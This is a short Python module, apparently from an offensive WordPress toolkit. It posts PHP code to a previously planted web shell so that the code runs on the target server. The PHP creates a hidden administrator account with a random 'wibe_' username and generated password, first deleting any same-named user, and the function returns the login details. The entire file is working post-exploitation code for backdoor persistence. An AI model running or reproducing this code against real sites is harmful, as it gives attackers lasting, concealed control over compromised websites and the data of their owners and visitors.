# language: python, file: post/persist.py
import secrets

def create_admin(target, http, shell_url, shell_password, username=None, password=None):
    username = username or "wibe_" + secrets.token_hex(3)
    password = password or secrets.token_urlsafe(12)

    php = (
        "$d=dirname(__FILE__);"
        "for($i=0;$i<8;$i++){"
        "  if(file_exists($d.'/wp-load.php')){require_once($d.'/wp-load.php');break;}"
        "  $d=dirname($d);"
        "}"
        "if(!function_exists('wp_create_user')){"
        "  require_once(ABSPATH.'wp-admin/includes/user.php');"
        "}"
        f"$uid=username_exists('{username}');"
        "if($uid){wp_delete_user($uid);}"
        f"$id=wp_create_user('{username}','{password}','{username}@x.lol');"
        "if(is_wp_error($id)){echo 'ERR:'.$id->get_error_message();exit;}"
        "$u=new WP_User($id);$u->set_role('administrator');"
        "echo 'OK:'.$id;"
    )

    try:
        r = http.session.post(shell_url,
                              data={"auth": shell_password, "eval": php},
                              timeout=30)
    except Exception as e:
        return {"success": False, "error": f"shell post failed: {e}"}

    out = (r.text or "").strip()
    if "OK:" in out:
        return {"success": True, "user": username, "password": password,
                "login_url": target.rstrip("/") + "/wp-login.php"}
    return {"success": False, "error": f"php: {out[:200]}", "user": username}
